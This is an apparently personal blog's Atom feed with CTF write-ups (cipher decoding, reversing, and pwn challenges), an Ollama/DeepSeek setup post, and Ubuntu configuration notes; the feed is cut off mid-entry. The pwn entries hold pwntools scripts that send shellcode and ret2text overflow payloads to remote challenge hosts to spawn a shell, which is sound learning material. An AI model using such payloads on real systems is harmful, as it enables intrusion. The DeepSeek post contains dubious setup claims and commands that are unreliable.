<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Rhea&#39;s Blog</title>
  
  
  <link href="https://rhea006.github.io/atom.xml" rel="self"/>
  
  <link href="https://rhea006.github.io/"/>
  <updated>2025-06-18T06:30:04.421Z</updated>
  <id>https://rhea006.github.io/</id>
  
  <author>
    <name>Rhea</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>r1_8b</title>
    <link href="https://rhea006.github.io/2025/06/38d795f72413.html"/>
    <id>https://rhea006.github.io/2025/06/38d795f72413.html</id>
    <published>2025-06-17T14:00:00.000Z</published>
    <updated>2025-06-18T06:30:04.421Z</updated>
    
    <content type="html"><![CDATA[<p>系统变量，对系统的所有账户生效，您可以根据情况自己选。点击添加添加，输入变量名OLLAMA_MODELS，变量值输入您放置ollama模型的新地址，我这里放在了E:\ollama\models</p><p><img src="/images/254E7FA0-46F1-4144-B913-C7C3E82AFEBA.png"></p><p><img src="/images/%7BE5D4D6BF-5C2F-450B-BF73-B2076752FB89%7D.png"></p><ol><li>拉取模型</li></ol><blockquote><p>ollama pull deepseek-r1:8b</p></blockquote><ol start="2"><li>运行模型</li></ol><blockquote><p>ollama run deepseek-r1:8b</p></blockquote><h3 id="🔍-Can-I-run-DeepSeek-R1-8B-via-Ollama"><a href="#🔍-Can-I-run-DeepSeek-R1-8B-via-Ollama" class="headerlink" title="🔍 Can I run DeepSeek-R1:8B via Ollama?"></a>🔍 Can I run DeepSeek-R1:8B via Ollama?</h3><p>Currently, <strong>Ollama does not officially support the DeepSeek-R1 8B model</strong> unless it has been added to their<br>repository or community-supported list. You should check:</p><ul><li>The <a href="https://ollama.com/models">Ollama models page</a> for updates.</li><li>Community forums (e.g., GitHub issues) if users have shared custom Docker images&#x2F;definitions.</li></ul><hr><h3 id="🧪-How-to-run-transformer-models-like-DeepSeek-R1-via-Ollama"><a href="#🧪-How-to-run-transformer-models-like-DeepSeek-R1-via-Ollama" class="headerlink" title="🧪 How to run transformer models like DeepSeek-R1 via Ollama"></a>🧪 How to run transformer models like DeepSeek-R1 via Ollama</h3><p>If the model is supported, you can use this command:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ollama run deepseek-r1:8b</span><br></pre></td></tr></table></figure><p>This will:</p><ul><li>Download (if not installed) and load the 8B parameter version of DeepSeek-R1.</li><li>Start a local instance for interactive chat or API access.</li></ul><hr><h3 id="🤔-What-is-DeepSeek-R1-8B"><a href="#🤔-What-is-DeepSeek-R1-8B" class="headerlink" title="🤔 What is DeepSeek-R1:8B?"></a>🤔 What is DeepSeek-R1:8B?</h3><p>DeepSeek-R1 is an advanced transformer language model developed by <a href="https://www.deepseek.com/">深度求索（DeepSeek）</a>. The “8B” refers to <strong>8 billion parameters</strong> in the model. It’s designed for:</p><ul><li>Natural language understanding and generation.</li><li>Code-related tasks (syntax, debugging).</li><li>Knowledge answering.</li><li>Creative writing.</li></ul><hr><h3 id="📄-Example-usage-with-Ollama-CLI"><a href="#📄-Example-usage-with-Ollama-CLI" class="headerlink" title="📄 Example usage with Ollama CLI"></a>📄 Example usage with Ollama CLI</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Start interactive chat (if supported)</span></span><br><span class="line">ollama chat deepseek-r1:8b</span><br><span class="line"></span><br><span class="line"><span class="comment"># Or generate text via API/command line:</span></span><br><span class="line">curl http://localhost:11434/api/generate \</span><br><span class="line">  -X POST \</span><br><span class="line">  -H <span class="string">&quot;Content-Type: application/json&quot;</span> \</span><br><span class="line">  -d <span class="string">&#x27;&#123;</span></span><br><span class="line"><span class="string">    &quot;model&quot;: &quot;deepseek-r1:8b&quot;,</span></span><br><span class="line"><span class="string">    &quot;prompt&quot;: &quot;Explain quantum computing in simple terms.&quot;,</span></span><br><span class="line"><span class="string">    &quot;stream&quot;: false</span></span><br><span class="line"><span class="string">  &#125;&#x27;</span></span><br></pre></td></tr></table></figure><hr><h3 id="⚠️-If-the-model-isn’t-supported-yet"><a href="#⚠️-If-the-model-isn’t-supported-yet" class="headerlink" title="⚠️ If the model isn’t supported yet:"></a>⚠️ If the model isn’t supported yet:</h3><p>You can try running it via Docker (if you have technical access):</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">docker run -d --name deepseek-r1 \</span><br><span class="line">  -p 11434:11434 \</span><br><span class="line">  --<span class="built_in">rm</span> \</span><br><span class="line">  -v ollama_models:/models \</span><br><span class="line">  llamafile/docker-ollama \</span><br><span class="line">  predict DeepSeek-R1 /models/deepseek-r1.tar</span><br></pre></td></tr></table></figure><p>But note: This may not be officially maintained.</p><hr><h3 id="🌟-What-else-can-Ollama-run"><a href="#🌟-What-else-can-Ollama-run" class="headerlink" title="🌟 What else can Ollama run?"></a>🌟 What else can Ollama run?</h3><p>Oll (a) supports models like:</p><ul><li>Llama, Mistral, Mixtral</li><li>GPT models (via LMSYS)</li><li>Gemma, Phi, CodeLlama</li><li>And many others!</li></ul><p>Check the <a href="https://ollama.com/models">current list on their website</a>.</p><hr><p>Let me know if you’d like help with a specific task using DeepSeek-R1 or another model! 😊</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;系统变量，对系统的所有账户生效，您可以根据情况自己选。点击添加添加，输入变量名OLLAMA_MODELS，变量值输入您放置ollama模型的新地址，我这里放在了E:&#92;ollama&#92;models&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/254E7FA0-46F1-4</summary>
      
    
    
    
    <category term="Deepseek" scheme="https://rhea006.github.io/categories/Deepseek/"/>
    
    
  </entry>
  
  <entry>
    <title>摩斯电码</title>
    <link href="https://rhea006.github.io/2025/06/828dca5ddec2.html"/>
    <id>https://rhea006.github.io/2025/06/828dca5ddec2.html</id>
    <published>2025-06-15T08:17:05.484Z</published>
    <updated>2025-06-15T12:07:49.885Z</updated>
    
    <content type="html"><![CDATA[<p>…. . .-.. .-.. — ..–.- -.-. .-. -.– .–. - —<br>hello_crypto<br>TZCFlag{HELLO_CRYPTO}</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;…. . .-.. .-.. — ..–.- -.-. .-. -.– .–. - —&lt;br&gt;hello_crypto&lt;br&gt;TZCFlag{HELLO_CRYPTO}&lt;/p&gt;
</summary>
      
    
    
    
    <category term="Crypto" scheme="https://rhea006.github.io/categories/Crypto/"/>
    
    <category term="常见编码" scheme="https://rhea006.github.io/categories/Crypto/%E5%B8%B8%E8%A7%81%E7%BC%96%E7%A0%81/"/>
    
    <category term="莫尔斯电码(Morse Code)" scheme="https://rhea006.github.io/categories/Crypto/%E5%B8%B8%E8%A7%81%E7%BC%96%E7%A0%81/%E8%8E%AB%E5%B0%94%E6%96%AF%E7%94%B5%E7%A0%81-Morse-Code/"/>
    
    
  </entry>
  
  <entry>
    <title>摩丝</title>
    <link href="https://rhea006.github.io/2025/06/21db97fd724d.html"/>
    <id>https://rhea006.github.io/2025/06/21db97fd724d.html</id>
    <published>2025-06-15T08:17:05.481Z</published>
    <updated>2025-06-15T12:07:37.828Z</updated>
    
    <content type="html"><![CDATA[<p>.. .-.. — …- . -.– — ..-<br>iloveyou</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;.. .-.. — …- . -.– — ..-&lt;br&gt;iloveyou&lt;/p&gt;
</summary>
      
    
    
    
    <category term="Crypto" scheme="https://rhea006.github.io/categories/Crypto/"/>
    
    <category term="常见编码" scheme="https://rhea006.github.io/categories/Crypto/%E5%B8%B8%E8%A7%81%E7%BC%96%E7%A0%81/"/>
    
    <category term="莫尔斯电码(Morse Code)" scheme="https://rhea006.github.io/categories/Crypto/%E5%B8%B8%E8%A7%81%E7%BC%96%E7%A0%81/%E8%8E%AB%E5%B0%94%E6%96%AF%E7%94%B5%E7%A0%81-Morse-Code/"/>
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://rhea006.github.io/2025/06/358bdb20a0d3.html"/>
    <id>https://rhea006.github.io/2025/06/358bdb20a0d3.html</id>
    <published>2025-06-15T08:17:05.445Z</published>
    <updated>2025-06-15T10:09:00.203Z</updated>
    
    
    
    
    <category term="Crypto" scheme="https://rhea006.github.io/categories/Crypto/"/>
    
    <category term="不知道分哪类" scheme="https://rhea006.github.io/categories/Crypto/%E4%B8%8D%E7%9F%A5%E9%81%93%E5%88%86%E5%93%AA%E7%B1%BB/"/>
    
    
  </entry>
  
  <entry>
    <title>password</title>
    <link href="https://rhea006.github.io/2025/06/fbf475443deb.html"/>
    <id>https://rhea006.github.io/2025/06/fbf475443deb.html</id>
    <published>2025-06-15T08:17:05.444Z</published>
    <updated>2025-06-15T12:07:11.505Z</updated>
    
    <content type="html"><![CDATA[<p>姓名：张三<br>生日：19900315<br>key格式为key{xxxxxxxxxx}</p><p>发现如果将张三变为 zs加上它的日期长度刚好符合题目的xx长度，那我们不妨试下：<br>flag{zs19900315}</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;姓名：张三&lt;br&gt;生日：19900315&lt;br&gt;key格式为key{xxxxxxxxxx}&lt;/p&gt;
&lt;p&gt;发现如果将张三变为 zs加上它的日期长度刚好符合题目的xx长度，那我们不妨试下：&lt;br&gt;flag{zs19900315}&lt;/p&gt;
</summary>
      
    
    
    
    <category term="Crypto" scheme="https://rhea006.github.io/categories/Crypto/"/>
    
    <category term="不知道分哪类" scheme="https://rhea006.github.io/categories/Crypto/%E4%B8%8D%E7%9F%A5%E9%81%93%E5%88%86%E5%93%AA%E7%B1%BB/"/>
    
    
  </entry>
  
  <entry>
    <title>dancemen</title>
    <link href="https://rhea006.github.io/2025/06/cbb71a3305da.html"/>
    <id>https://rhea006.github.io/2025/06/cbb71a3305da.html</id>
    <published>2025-06-15T08:17:05.443Z</published>
    <updated>2025-06-18T06:30:11.626Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/dancemen.jpg"><br><img src="/images/Pastedimage20250603124314.png"><br>TZCFlag{dancemenareinteresting}</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/images/dancemen.jpg&quot;&gt;&lt;br&gt;&lt;img src=&quot;/images/Pastedimage20250603124314.png&quot;&gt;&lt;br&gt;TZCFlag{dancemenareinteresting}&lt;/p&gt;
</summary>
      
    
    
    
    <category term="Crypto" scheme="https://rhea006.github.io/categories/Crypto/"/>
    
    <category term="不知道分哪类" scheme="https://rhea006.github.io/categories/Crypto/%E4%B8%8D%E7%9F%A5%E9%81%93%E5%88%86%E5%93%AA%E7%B1%BB/"/>
    
    
  </entry>
  
  <entry>
    <title>Rabbit 1</title>
    <link href="https://rhea006.github.io/2025/06/bf8f92268b07.html"/>
    <id>https://rhea006.github.io/2025/06/bf8f92268b07.html</id>
    <published>2025-06-15T08:17:05.434Z</published>
    <updated>2025-06-18T06:30:04.372Z</updated>
    
    <content type="html"><![CDATA[<p>U2FsdGVkX1&#x2F;+ydnDPowGbjjJXhZxm2MP2AgI<br><img src="/images/8C5ED5D3-48AE-4A5B-94BF-527E062586AC.png"><br><a href="https://www.sojson.com/encrypt_rabbit.html">https://www.sojson.com/encrypt_rabbit.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;U2FsdGVkX1&amp;#x2F;+ydnDPowGbjjJXhZxm2MP2AgI&lt;br&gt;&lt;img src=&quot;/images/8C5ED5D3-48AE-4A5B-94BF-527E062586AC.png&quot;&gt;&lt;br&gt;&lt;a href=&quot;https://www.sojson.</summary>
      
    
    
    
    <category term="Crypto" scheme="https://rhea006.github.io/categories/Crypto/"/>
    
    <category term="Rabbit" scheme="https://rhea006.github.io/categories/Crypto/Rabbit/"/>
    
    
  </entry>
  
  <entry>
    <title>shellcode</title>
    <link href="https://rhea006.github.io/2025/06/63e0052f564e.html"/>
    <id>https://rhea006.github.io/2025/06/63e0052f564e.html</id>
    <published>2025-06-14T14:00:00.000Z</published>
    <updated>2025-06-18T06:30:04.390Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/%7BD963E729-82E8-4920-BCC6-3E43CDB31255%7D1.png"><br>检查安全机制发现 <strong>NX (No-Execute) 已启用</strong>，这意味着栈内存不可执行，因此无法直接执行栈上的 shellcode。但题目中有一个明显的 <strong>后门函数</strong>，这应该才是解题的关键。<br><img src="/images/Pastedimage20250605220423.png"><br><img src="/images/Pastedimage20250605220507.png"><br>也没有开啥保护。<br>logo明显提示用shellcode,所以我们需要发送sellcode。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">e=ELF(<span class="string">&quot;./pwn3&quot;</span>)</span><br><span class="line">p=remote(<span class="string">&quot;10.190.131.17&quot;</span>,<span class="number">62534</span>)</span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line">payload=shellcode</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/images/%7B17DD8EEB-247B-4BB2-8BA3-995677E38184%7D1.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/images/%7BD963E729-82E8-4920-BCC6-3E43CDB31255%7D1.png&quot;&gt;&lt;br&gt;检查安全机制发现 &lt;strong&gt;NX (No-Execute) 已启用&lt;/strong&gt;，这意味着栈内存不可执行，因此无法直接执行</summary>
      
    
    
    
    <category term="PWN" scheme="https://rhea006.github.io/categories/PWN/"/>
    
    
  </entry>
  
  <entry>
    <title>整数溢出</title>
    <link href="https://rhea006.github.io/2025/06/1f04604b780a.html"/>
    <id>https://rhea006.github.io/2025/06/1f04604b780a.html</id>
    <published>2025-06-14T14:00:00.000Z</published>
    <updated>2025-06-18T06:30:04.390Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/%7B82DBD94C-4B71-4F33-8BD4-3EECD2675F78%7D.png"><br><img src="/images/Pastedimage20250605212046.png"><br><img src="/images/Pastedimage20250605212223.png"><br>这里的<strong>0 ~ 0x7fffffff</strong>就是 <strong>0~2147483647</strong> ，<br><strong>0x80000000 ~ 0xffffffff</strong>就是 <strong>-2147483648 ~ -1</strong><br><img src="/images/Pastedimage20250605212238.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置环境</span></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 连接服务器（根据题目提示修改端口）</span></span><br><span class="line">p = remote(<span class="string">&#x27;10.190.131.17&#x27;</span>, <span class="number">61862</span>)  <span class="comment"># 示例端口</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 等待提示</span></span><br><span class="line">p.recvuntil(<span class="string">b&quot;Enter an unsigned integer: &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送目标数字</span></span><br><span class="line">p.sendline(<span class="string">b&quot;4294967295&quot;</span>)  <span class="comment"># 或 b&quot;-1&quot; 在某些环境下也可</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 接收flag</span></span><br><span class="line"><span class="built_in">print</span>(p.recvall().decode())</span><br></pre></td></tr></table></figure><p>这道题涉及整数溢出漏洞利用，目标是通过输入特定数字触发<code>gift()</code>函数获取flag。以下是完整的解题步骤：</p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><ol><li><strong>关键代码</strong>：<br> printf(“Enter an unsigned integer: “);<br> _isoc99_scanf(“%u”, &amp;v4);  &#x2F;&#x2F; 读取无符号整数<br> if (v4 &#x3D;&#x3D; -1)  &#x2F;&#x2F; -1在无符号中等于4294967295<br> gift();    &#x2F;&#x2F; 触发flag输出</li><li><strong>整数溢出原理</strong>：<ul><li><code>v4</code>是<code>unsigned int</code>类型（4字节）</li><li><code>-1</code>在内存中被解释为无符号整数的最大值：<code>0xFFFFFFFF</code>（4294967295）    </li><li>输入<code>4294967295</code>可使条件<code>v4 == -1</code>成立</li></ul></li><li><strong>防护机制</strong>：<br> Full RELRO | Canary | NX | PIE<br> 虽然防护较强，但无需绕过这些保护，因为利用不涉及栈溢出</li></ol><h3 id="利用步骤"><a href="#利用步骤" class="headerlink" title="利用步骤"></a>利用步骤</h3><ol><li><strong>计算目标值</strong>：<br> 4294967295 &#x3D; 2³² - 1 &#x3D; 0xFFFFFFFF</li><li><strong>触发gift函数</strong>：<ul><li>当输入<code>4294967295</code>时：<br>  v4 &#x3D; 4294967295 &#x3D; 0xFFFFFFFF<br>  v4 &#x3D;&#x3D; -1 → True  &#x2F;&#x2F; 因为-1在无符号中就是0xFFFFFFFF</li><li>执行<code>system(&quot;cat /ctfshow_flag&quot;)</code><br><img src="/images/%7B91C4D1E4-DA5C-45B1-A1AE-72BD35872AC2%7D.png"></li></ul></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/images/%7B82DBD94C-4B71-4F33-8BD4-3EECD2675F78%7D.png&quot;&gt;&lt;br&gt;&lt;img src=&quot;/images/Pastedimage20250605212046.png&quot;&gt;&lt;br&gt;&lt;img src=&quot;/ima</summary>
      
    
    
    
    <category term="PWN" scheme="https://rhea006.github.io/categories/PWN/"/>
    
    
  </entry>
  
  <entry>
    <title>ret2text</title>
    <link href="https://rhea006.github.io/2025/06/6eb5ab8aa336.html"/>
    <id>https://rhea006.github.io/2025/06/6eb5ab8aa336.html</id>
    <published>2025-06-14T14:00:00.000Z</published>
    <updated>2025-06-18T06:30:04.390Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/%7B53C70E9A-8E89-4C8B-95E3-7078BD55343B%7D1.png"><br>32位<br>![](images&#x2F;&#x2F;assets&#x2F;images&#x2F;Pasted image 20250605135457.png)<br>Tab键<br>![](images&#x2F;&#x2F;assets&#x2F;images&#x2F;Pasted image 20250605135812.png)<br>nc一下<br><img src="/images/%7BEAFBEA4F-0F51-421C-AD17-A89910A6224D%7D.png"><br>看pwnme函数<br>![](images&#x2F;&#x2F;assets&#x2F;images&#x2F;Pasted image 20250605140015.png)<br>这里有个fgets函数<br>Tab键<br>![](images&#x2F;&#x2F;assets&#x2F;images&#x2F;Pasted image 20250605140201.png)<br><strong>&#x3D;&#x3D;可以看到第一行s这个变量是在距离栈底ebp9个字节的地方&#x3D;&#x3D;</strong><br><img src="/images/%7B463C8EE2-1263-43AF-B876-7B0C4F4B928F%7D.png"><br>题目叫stack，所以看了一下stack函数<br>![](images&#x2F;&#x2F;assets&#x2F;images&#x2F;Pasted image 20250605140449.png)<br>妥妥的getshell函数<br>这段代码 system(“&#x2F;bin&#x2F;sh”) 的作用是在 Linux 系统中执行 &#x2F;bin&#x2F;sh 命令，它会打开一个新的 shell 进程。<br>具体来说，&#x2F;bin&#x2F;sh 是指向系统中的默认 shell 解释器的路径。通过执行该命令，你将进入一个新的交互式 shell 环境，可以在其中执行各种命令和操作。这对于开发者或者在某些情况下需要与系统进行交互的用户来说非常有用。</p><p>main点一下绿色<br><img src="/images/Pastedimage20250605141027.png"><br>可以看到该函数地址为0x0804850F<br><img src="/images/%7B3BBE1FF3-C061-4222-B03E-C2B1AB35901F%7D.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io=remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>,<span class="number">28308</span>)    <span class="comment">#远程连接</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">9</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(<span class="number">0x0804850F</span>)   <span class="comment">#用a字符填满前面9个字节的空白，然后再用4字节填满原来的ebp(这里为汇编基础，因为程序位32位程序）</span></span><br><span class="line"></span><br><span class="line">io.sendline(payload)                    <span class="comment">#然后p32将stack函数写入地址的四个字节</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><img src="/images/%7B3D19A85A-20C8-444E-A235-C906BCB99447%7D.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p =remote(<span class="string">&quot;pwn.chall.ctf.show&quot;</span>,<span class="number">28006</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x9</span>+<span class="number">4</span>) + p32(<span class="number">0x0804850F</span>))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/images/%7B53C70E9A-8E89-4C8B-95E3-7078BD55343B%7D1.png&quot;&gt;&lt;br&gt;32位&lt;br&gt;![](images&amp;#x2F;&amp;#x2F;assets&amp;#x2F;images&amp;#x2F;Pasted image </summary>
      
    
    
    
    <category term="PWN" scheme="https://rhea006.github.io/categories/PWN/"/>
    
    
  </entry>
  
  <entry>
    <title>ELF</title>
    <link href="https://rhea006.github.io/2025/06/232c7fc0fbd9.html"/>
    <id>https://rhea006.github.io/2025/06/232c7fc0fbd9.html</id>
    <published>2025-06-14T14:00:00.000Z</published>
    <updated>2025-06-15T12:29:14.845Z</updated>
    
    <content type="html"><![CDATA[<p>linux也能逆？</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;linux也能逆？&lt;/p&gt;
</summary>
      
    
    
    
    <category term="REVERSE" scheme="https://rhea006.github.io/categories/REVERSE/"/>
    
    
  </entry>
  
  <entry>
    <title>tea</title>
    <link href="https://rhea006.github.io/2025/06/e1972a9f50a5.html"/>
    <id>https://rhea006.github.io/2025/06/e1972a9f50a5.html</id>
    <published>2025-06-14T14:00:00.000Z</published>
    <updated>2025-06-18T06:30:04.372Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/Pastedimage20250606185429.png"><br><img src="/images/Pastedimage20250606185436.png"><br><img src="/images/Pastedimage20250606185452.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/images/Pastedimage20250606185429.png&quot;&gt;&lt;br&gt;&lt;img src=&quot;/images/Pastedimage20250606185436.png&quot;&gt;&lt;br&gt;&lt;img src=&quot;/images/Pastedimage20</summary>
      
    
    
    
    <category term="REVERSE" scheme="https://rhea006.github.io/categories/REVERSE/"/>
    
    
  </entry>
  
  <entry>
    <title>简单的加密</title>
    <link href="https://rhea006.github.io/2025/06/596e40547bb0.html"/>
    <id>https://rhea006.github.io/2025/06/596e40547bb0.html</id>
    <published>2025-06-14T14:00:00.000Z</published>
    <updated>2025-06-18T06:30:04.372Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/Pastedimage20250604161939.png"><br>shift+F12+Fn<br><img src="/images/Pastedimage20250604162108.png"><br>点击<br><img src="/images/Pastedimage20250604162142.png"><br>点击紫色的<br><img src="/images/Pastedimage20250604162209.png"><br>Tab键<br><img src="/images/%7B25FB6DF9-3CCD-4E0E-8CCD-6A7C5D792114%7D.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main_0(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  size_t i; // [esp+D0h] [ebp-114h]  </span><br><span class="line">  char Str1[260]; // [esp+DCh] [ebp-108h] BYREF</span><br><span class="line">  </span><br><span class="line">  #提示用户输入 flag</span><br><span class="line">  sub_456502(&quot;Hi CTFer,Input your flag:&quot;);</span><br><span class="line">  sub_4554EF(&quot;%s&quot;, Str1);</span><br><span class="line">  </span><br><span class="line">  for ( i = 0; i &lt; j__strlen(Str1); ++i )</span><br><span class="line">    ++Str1[i]; #将每个字符的 ASCII 值加 1</span><br><span class="line">  if ( !j__strcmp(Str1, &quot;gmbh|ZPV`GJOE`JU`IBIB~&quot;) )</span><br><span class="line">    sub_456502(&quot;you are right!\n&quot;);</span><br><span class="line">  else</span><br><span class="line">    sub_456502(&quot;you are wrong!\n&quot;);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对目标字符串 gmbh{ZPV<code>GJOE</code>JU<code>IBIB~&#125; 进行反向操作（每个字符减 1），得到原始输入的 flag：  每个字符减 1 后：</code>flag{YOU_FIND_IT_HAHA}&#96;</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/images/Pastedimage20250604161939.png&quot;&gt;&lt;br&gt;shift+F12+Fn&lt;br&gt;&lt;img src=&quot;/images/Pastedimage20250604162108.png&quot;&gt;&lt;br&gt;点击&lt;br&gt;&lt;img src=</summary>
      
    
    
    
    <category term="REVERSE" scheme="https://rhea006.github.io/categories/REVERSE/"/>
    
    
  </entry>
  
  <entry>
    <title>apt源</title>
    <link href="https://rhea006.github.io/2025/06/53e892fa4bab.html"/>
    <id>https://rhea006.github.io/2025/06/53e892fa4bab.html</id>
    <published>2025-06-14T14:00:00.000Z</published>
    <updated>2025-06-15T12:30:29.448Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Types: deb</span><br><span class="line">URIs: http://mirrors.ustc.edu.cn/ubuntu/</span><br><span class="line">Suites: noble noble-updates noble-security</span><br><span class="line">Components: main restricted universe multiverse</span><br><span class="line">Signed-By: /usr/share/keyrings/ubuntu-archive-keyring.gpg</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span c</summary>
      
    
    
    
    <category term="Ubuntu" scheme="https://rhea006.github.io/categories/Ubuntu/"/>
    
    
  </entry>
  
  <entry>
    <title>配置静态ip</title>
    <link href="https://rhea006.github.io/2025/06/2ac849227b33.html"/>
    <id>https://rhea006.github.io/2025/06/2ac849227b33.html</id>
    <published>2025-06-14T14:00:00.000Z</published>
    <updated>2025-06-18T06:30:04.372Z</updated>
    
    <content type="html"><![CDATA[<p>sudo -i #root用户<br> ls -l &#x2F;etc&#x2F;netplan<br><img src="/images/Pastedimage20250601205045.png"><br>sudo chmod 600 &#x2F;etc&#x2F;netplan&#x2F;01-network-manager-all.yaml  #修改文件权限<br>sudo nano &#x2F;etc&#x2F;netplan&#x2F;01-network-manager-all.yaml  #更新配置文件内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">network:</span><br><span class="line">  version: 2</span><br><span class="line">  renderer: NetworkManager</span><br><span class="line">  ethernets:</span><br><span class="line">    ens33:</span><br><span class="line">      addresses: [192.168.142.132/24]         # 设置静态IP地址和掩码</span><br><span class="line">      routes:</span><br><span class="line">        - to: default</span><br><span class="line">          via: 192.168.142.2</span><br><span class="line">      nameservers:</span><br><span class="line">        addresses: [114.114.114.114,8.8.8.8]  # 设置主、备DNS</span><br><span class="line">      dhcp4: false                            # 禁用dhcp</span><br></pre></td></tr></table></figure><p>sudo netplan apply  #应用更改</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 